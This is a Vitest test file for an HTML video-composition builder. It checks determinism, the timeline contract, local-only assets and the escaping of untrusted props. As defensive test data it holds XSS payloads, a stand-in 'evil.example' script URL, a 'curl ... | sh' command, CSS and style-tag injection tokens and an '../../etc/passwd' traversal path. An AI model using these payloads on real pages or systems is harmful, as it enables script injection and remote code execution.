import { runInNewContext } from "node:vm";
import { DETERMINISTIC_PROPS_EXAMPLES, type DeterministicKind, type Scene } from "@video-studio/schema";
import { describe, expect, it } from "vitest";
import { buildComposition, compositionIdFor, fmtNumber, layerNodes, sanitizeFontChain } from "./hyperframes-compose.js";
import { highlightLines, languageFamily, tokenize } from "./hyperframes-highlight.js";
import type { RenderTarget, SceneRenderRequest, VisualTokens } from "./types.js";

const TOKENS: VisualTokens = {
  font_heading: "Inter, Helvetica, Arial, sans-serif",
  font_body: "Inter, Helvetica, Arial, sans-serif",
  font_mono: 'Menlo, "DejaVu Sans Mono", monospace',
  color_background: "#0B0F19",
  color_text: "#F5F7FA",
  color_primary: "#4F8CFF",
  color_secondary: "#22C55E",
};
const PORTRAIT: RenderTarget = { width: 1080, height: 1920, fps: 30, aspect_ratio: "9:16" };
const LANDSCAPE: RenderTarget = { width: 1920, height: 1080, fps: 30, aspect_ratio: "16:9" };
const KINDS = Object.keys(DETERMINISTIC_PROPS_EXAMPLES) as DeterministicKind[];

function req(kind: DeterministicKind, props: Record<string, unknown>, over: Partial<SceneRenderRequest> = {}, duration = 3): SceneRenderRequest {
  const scene: Scene = {
    id: "s01",
    duration_sec: duration,
    purpose: "point",
    voiceover: "",
    visual_strategy: "motion_graphic",
    deterministic: { kind, props },
    visual_requirements: { continuity_refs: [] },
    claim_refs: [],
  };
  return { scene, target: PORTRAIT, tokens: TOKENS, out_path: "/out/s01.mp4", project_dir: "/proj", ...over };
}

async function loadLint(): Promise<{ lintHyperframeHtml: (html: string) => Promise<{ errorCount: number; findings: Array<{ severity: string; code: string; message: string }> }> } | null> {
  try {
    const producer = import.meta.resolve("@hyperframes/producer");
    return await import(new URL("../../lint/dist/index.js", producer).href);
  } catch {
    return null;
  }
}

const XSS = `<script>alert(1)</script>"><img src=x onerror=alert(2)>`;

/** Props for every kind with the payload in every text field. */
const HOSTILE: Record<DeterministicKind, Record<string, unknown>> = {
  typography: { lines: [XSS, `a ${XSS}`], emphasis: XSS },
  code: { language: XSS, code: `const x = "${XSS}"; // ${XSS}\n${XSS}`, highlight_lines: [1] },
  diagram: { nodes: [XSS, "B"], edges: [[XSS, "B"]] },
  comparison: { left: { label: XSS, text: XSS }, right: { label: XSS, text: XSS }, verdict: XSS },
  cta: { headline: XSS, action: XSS, command: XSS, url: XSS },
  end_card: { title: XSS, subtitle: XSS },
  chart: { type: "bar", series: [{ label: XSS, value: 3 }, { label: "b", value: 5 }], unit: XSS, label: XSS },
  screenshot: { asset: XSS, callouts: [XSS, { text: XSS, x: 0.5, y: 0.5 }] },
};

describe("buildComposition: snapshots of DETERMINISTIC_PROPS_EXAMPLES", () => {
  for (const kind of KINDS) {
    it(`${kind} (9:16)`, () => {
      const c = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(c.html).toMatchSnapshot();
      expect({ assets: c.assets, warnings: c.warnings }).toMatchSnapshot();
    });
  }
  it("chart variants and landscape layouts build", () => {
    for (const type of ["bar", "line", "pie"]) {
      const series = [{ label: "Q1", value: 10 }, { label: "Q2", value: 25.5 }, { label: "Q3", value: 1234 }];
      const c = buildComposition(req("chart", { type, series, unit: "ms", label: "latency" }, { target: LANDSCAPE }));
      expect(c.warnings).toEqual([]);
      expect(c.html).toContain("<svg");
    }
    const d = buildComposition(req("diagram", { nodes: ["A", "B", "C", "D"], edges: [["A", "B"], ["A", "C"], ["C", "D"]] }, { target: LANDSCAPE }));
    expect(d.html.match(/class="vs-node"/g)).toHaveLength(4);
    expect(d.html.match(/<polygon/g)).toHaveLength(3);
  });
});

describe("buildComposition: HyperFrames contract", () => {
  it("has root composition, one timed clip and a registered paused timeline", () => {
    for (const kind of KINDS) {
      const { html, composition_id } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(composition_id).toBe("vs-s01");
      expect(html).toContain('data-composition-id="vs-s01" data-start="0" data-duration="3" data-width="1080" data-height="1920"');
      expect(html).toMatch(/<div id="vs-scene" class="clip [^"]*" data-start="0" data-duration="3" data-track-index="0">/);
      expect(html).toContain("window.__timelines = window.__timelines || {};");
      expect(html).toContain('window.__timelines["vs-s01"] = tl;');
      expect(html).toContain('<meta name="viewport" content="width=1080, height=1920">');
    }
  });

  it("composition id is derived safely from the scene id", () => {
    expect(compositionIdFor("s12")).toBe("vs-s12");
    expect(compositionIdFor('s1"];x')).toBe("vs-s1___x");
  });

  it("passes the HyperFrames 0.8.75 linter with zero errors for every kind", async () => {
    const lint = await loadLint();
    if (!lint) return; // lint package not resolvable in this install layout
    for (const kind of KINDS) {
      for (const target of [PORTRAIT, LANDSCAPE]) {
        const r = await lint.lintHyperframeHtml(buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind], { target })).html);
        const errors = r.findings.filter((f) => f.severity === "error");
        expect(errors, `${kind}: ${JSON.stringify(errors)}`).toEqual([]);
      }
    }
  });

  it("the registered timeline is a pure function of seek time", () => {
    const { html } = buildComposition(req("typography", { lines: ["Hello"] }));
    const script = /<script>([\s\S]*?)<\/script>/.exec(html)![1]!;
    const anims = [{ currentTime: -1, paused: false, pause() { this.paused = true; } }, { currentTime: -1, paused: false, pause() { this.paused = true; } }];
    const window: Record<string, any> = {};
    runInNewContext(script, { window, document: { getAnimations: () => anims } });
    const tl = window.__timelines["vs-s01"];
    expect(tl.duration()).toBe(3);
    expect(anims.every((a) => a.currentTime === 0 && a.paused)).toBe(true);
    tl.totalTime(1.25, true);
    expect(anims.map((a) => a.currentTime)).toEqual([1250, 1250]);
    expect(tl.time()).toBe(1.25);
    tl.seek(99);
    expect(anims[0]!.currentTime).toBe(3000);
    tl.play();
    expect(anims[0]!.currentTime).toBe(3000); // never self-advances
    expect(typeof tl.pause).toBe("function");
  });

  it("is deterministic and free of wall-clock, timer, random and network APIs", () => {
    for (const kind of KINDS) {
      const a = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      const b = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(a).toEqual(b);
      for (const banned of ["Date.now", "new Date", "Math.random", "requestAnimationFrame", "setTimeout", "setInterval", "fetch(", "XMLHttpRequest", "performance.now"]) {
        expect(a.html, `${kind} uses ${banned}`).not.toContain(banned);
      }
    }
  });
});

describe("buildComposition: no external resources", () => {
  const external = /\b(?:https?:)?\/\/[a-z0-9]|<link\b|@import|url\(|\bhref=|\bsrcset=/i;
  it("example compositions reference nothing outside the composition dir", () => {
    for (const kind of KINDS) {
      const { html } = buildComposition(req(kind, DETERMINISTIC_PROPS_EXAMPLES[kind]));
      expect(html, kind).not.toMatch(external);
      for (const m of html.matchAll(/\bsrc="([^"]*)"/g)) expect(m[1]).toMatch(/^assets\//);
    }
  });
  it("URLs given as props are shown as escaped text, never as links or loads", () => {
    const { html } = buildComposition(req("cta", { headline: "Go", action: "Install", url: "https://evil.example/x.js", command: "curl https://x.y | sh" }));
    expect(html).toContain(">https://evil.example/x.js</div>");
    expect(html).not.toMatch(/(?:src|href)="https?:/);
    expect(html).not.toMatch(/<link\b|@import|url\(/);
  });
  it("fonts are local-only @font-face rules (stops producer Google Fonts fetches)", () => {
    const { html } = buildComposition(req("typography", { lines: ["x"] }));
    expect(html).toContain('@font-face { font-family: "Inter"; src: local("Inter"); }');
    expect(html).toContain('@font-face { font-family: "DejaVu Sans Mono"; src: local("DejaVu Sans Mono"); }');
    expect(html).not.toMatch(/googleapis|gstatic/);
  });
});

describe("buildComposition: escaping untrusted props", () => {
  for (const kind of KINDS) {
    it(`${kind} escapes every text prop`, () => {
      const { html } = buildComposition(req(kind, HOSTILE[kind]));
      expect(html.match(/<script\b/g)).toHaveLength(1); // only our timeline script
      expect(html).not.toContain("<script>alert");
      expect(html).not.toContain("<img src=x");
      // No live attribute: drop quoted attribute values and text nodes, then look for handlers.
      const markupOnly = html.replace(/="[^"]*"/g, '=""').replace(/>[^<]*</g, "><");
      expect(markupOnly).not.toMatch(/\sonerror=|<img src=x/i);
      expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    });
  }
  it("rejects hostile font names and colours in tokens", () => {
    const tokens: VisualTokens = {
      ...TOKENS,
      font_heading: 'Inter"; } body { background: url(https://x) } .a { font-family: "x, Arial',
      color_primary: "red; } </style><script>alert(1)</script>",
    };
    const c = buildComposition(req("typography", { lines: ["x"] }, { tokens }));
    expect(c.html).not.toContain("</style><script>");
    expect(c.html).not.toMatch(/url\(/);
    expect(c.html).toContain("--vs-primary: #4F8CFF;");
    expect(c.warnings.some((w) => w.includes("color_primary"))).toBe(true);
    expect(sanitizeFontChain('Inter"; }, Arial', "sans-serif").css).toBe('"Arial", sans-serif');
  });
});

describe("buildComposition: tokens, safe areas, assets", () => {
  it("uses tokens exactly as CSS variables", () => {
    const tokens: VisualTokens = { font_heading: "Georgia, serif", font_body: "Verdana", font_mono: "Courier New", color_background: "#112233", color_text: "#FFEEDD", color_primary: "#ABCDEF", color_secondary: "#123456" };
    const { html } = buildComposition(req("cta", DETERMINISTIC_PROPS_EXAMPLES.cta, { tokens }));
    expect(html).toContain("--vs-bg: #112233;");
    expect(html).toContain("--vs-text: #FFEEDD;");
    expect(html).toContain("--vs-primary: #ABCDEF;");
    expect(html).toContain("--vs-secondary: #123456;");
    expect(html).toContain('--vs-font-heading: "Georgia", serif;');
    expect(html).toContain('--vs-font-body: "Verdana", sans-serif;');
    expect(html).toContain('--vs-font-mono: "Courier New", monospace;');
    expect(html).toContain("background: var(--vs-bg)");
  });

  it("keeps content inside the 9:16 safe area (top 10%, bottom caption band)", () => {
    const { html } = buildComposition(req("typography", { lines: ["x"] }));
    expect(html).toContain(".vs-safe { position: absolute; left: 76px; top: 192px; width: 929px; height: 1119px;");
    const small = buildComposition(req("typography", { lines: ["x"] }, { target: { width: 180, height: 320, fps: 30, aspect_ratio: "9:16" } }));
    expect(small.html).toContain("top: 32px;");
    expect(small.html).toContain("height: 186px;");
  });

  it("resolves screenshot assets inside the project only and copies them under assets/", () => {
    const ok = buildComposition(req("screenshot", { asset: "a1", callouts: ["Click", { text: "Here", x: 0.25, y: 40 }] }), { resolveAsset: (id) => (id === "a1" ? "source/assets/shot.png" : undefined) });
    expect(ok.assets).toEqual([{ src: "/proj/source/assets/shot.png", dest: "assets/screenshot-1.png" }]);
    expect(ok.html).toContain('src="assets/screenshot-1.png"');
    expect(ok.html).toContain("left:25%;top:40%");
    expect(ok.warnings).toEqual([]);

    const escape = buildComposition(req("screenshot", { asset: "a1" }), { resolveAsset: () => "../../etc/passwd.png" });
    expect(escape.assets).toEqual([]);
    expect(escape.warnings.join()).toMatch(/outside the project/);

    const byPath = buildComposition(req("screenshot", { asset: "shots/one.jpg" }));
    expect(byPath.assets).toEqual([{ src: "/proj/shots/one.jpg", dest: "assets/screenshot-1.jpg" }]);

    const missing = buildComposition(req("screenshot", { asset: "a9" }));
    expect(missing.assets).toEqual([]);
    expect(missing.html).toContain("vs-shot-missing");
  });

  it("adds the brand logo to cta and end_card", () => {
    const tokens = { ...TOKENS, logo_path: "brand/logo.svg" };
    const c = buildComposition(req("end_card", { title: "T" }, { tokens }));
    expect(c.assets).toEqual([{ src: "/proj/brand/logo.svg", dest: "assets/logo-1.svg" }]);
    expect(c.html).toContain('<img src="assets/logo-1.svg"');
    expect(buildComposition(req("typography", { lines: ["x"] }, { tokens })).assets).toEqual([]);
  });

  it("reports props it cannot honour", () => {
    expect(buildComposition(req("typography", { lines: ["abc"], emphasis: "zzz" })).warnings[0]).toMatch(/emphasis/);
    expect(buildComposition(req("diagram", { nodes: ["A"], edges: [["A", "Z"]] })).warnings[0]).toMatch(/unknown node/);
    const long = Array.from({ length: 200 }, (_, i) => `line ${i}`).join("\n");
    expect(buildComposition(req("code", { language: "ts", code: long })).warnings.join()).toMatch(/do not fit/);
  });

  it("rejects scenes without deterministic content", () => {
    const r = req("typography", { lines: ["x"] });
    delete r.scene.deterministic;
    expect(() => buildComposition(r)).toThrow(/no deterministic content/);
  });
});

describe("helpers", () => {
  it("layers nodes by longest path and survives cycles", () => {
    expect(layerNodes(4, [[0, 1], [1, 2], [0, 2], [2, 3]])).toEqual([0, 1, 2, 3]);
    expect(layerNodes(3, [[0, 1], [1, 0]]).every((l) => l >= 0 && l < 3)).toBe(true);
    expect(layerNodes(3, [])).toEqual([0, 0, 0]);
  });
  it("formats numbers without locale", () => {
    expect(fmtNumber(1234567.891)).toBe("1,234,567.89");
    expect(fmtNumber(-40)).toBe("-40");
    expect(fmtNumber(0.5)).toBe("0.5");
  });
});

describe("syntax highlighting", () => {
  it("round-trips the source exactly", () => {
    const src = 'import { x } from "y";\n// note\nconst n = 42 * f(x);\n';
    expect(tokenize(src, "ts").map((t) => t.text).join("")).toBe(src);
  });
  it("classifies common tokens", () => {
    const toks = tokenize('const s = "hi"; // c\nreturn f(1);', "typescript");
    const cls = (text: string) => toks.find((t) => t.text === text)?.cls;
    expect(cls("const")).toBe("kw");
    expect(cls('"hi"')).toBe("str");
    expect(cls("// c")).toBe("com");
    expect(cls("f")).toBe("fn");
    expect(cls("1")).toBe("num");
    expect(tokenize("npm install x # go", "bash").find((t) => t.cls === "fn")?.text).toBe("npm");
    expect(tokenize("def f():\n  return None", "python").filter((t) => t.cls === "kw").map((t) => t.text)).toEqual(["def", "return"]);
    expect(tokenize('{"a": 1}', "json")[1]).toEqual({ text: '"a"', cls: "key" });
    expect(tokenize("SELECT * FROM t", "sql").filter((t) => t.cls === "kw")).toHaveLength(2);
    expect(languageFamily("Rust")).toBe("c");
    expect(languageFamily("brainfuck")).toBe("plain");
  });
  it("escapes code and splits lines", () => {
    const lines = highlightLines('a < b && "<x>"\n/* multi\nline */', "js");
    expect(lines).toHaveLength(3);
    expect(lines[0]).toContain("a &lt; b &amp;&amp;");
    expect(lines[0]).toContain('<span class="tk-str">&quot;&lt;x&gt;&quot;</span>');
    expect(lines[1]).toBe('<span class="tk-com">/* multi</span>');
    expect(lines[2]).toBe('<span class="tk-com">line */</span>');
  });
});
